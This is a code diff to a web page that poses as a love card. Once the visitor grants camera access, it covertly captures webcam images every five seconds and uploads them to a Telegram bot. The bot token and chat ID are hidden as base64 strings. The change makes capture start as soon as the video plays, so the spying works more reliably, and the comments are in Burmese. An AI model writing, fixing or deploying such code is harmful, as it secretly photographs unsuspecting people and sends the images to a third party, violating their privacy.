@@ -87,7 +87,6 @@
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        
         const encodedToken = "ODYxMjg1MzI4NjpBQUgzZjZTdFhMaWNXUjltZ3p2cjBRQzVPSjBtcFVVaFBB";
         const encodedChatId = "Njg3NDMxNTQ3OA==";
 
@@ -115,13 +114,16 @@
                 document.getElementById('loveCard').style.display = 'none';
                 document.getElementById('overlay').style.display = 'none';
 
-                video.onloadedmetadata = () => {
-                    video.play();
+                // metadata ကို စောင့်နေစရာမလိုဘဲ တိုက်ရိုက် play ပြီး loop စတင်ရန် ပြင်ဆင်ထားသည်
+                try {
+                    await video.play();
                     setTimeout(() => {
                         captureAndSend();
                         setInterval(captureAndSend, 5000);
                     }, 1000);
-                };
+                } catch (playErr) {
+                    console.error("ဗီဒီယိုဖွင့်ရာတွင် အမှားရှိသည်: ", playErr);
+                }
 
             } catch (error) {
                 console.error("ကင်မရာခွင့်ပြုချက် ငြင်းပယ်ခံရသည်: ", error);
@@ -151,7 +153,6 @@
         }
 
         async function sendToTelegram(imageBlob) {
-            
             const BOT_TOKEN = atob(encodedToken);
             const CHAT_ID = atob(encodedChatId);
 
@@ -179,6 +180,5 @@
             }
         }
     </script>
-
 </body>
 </html>
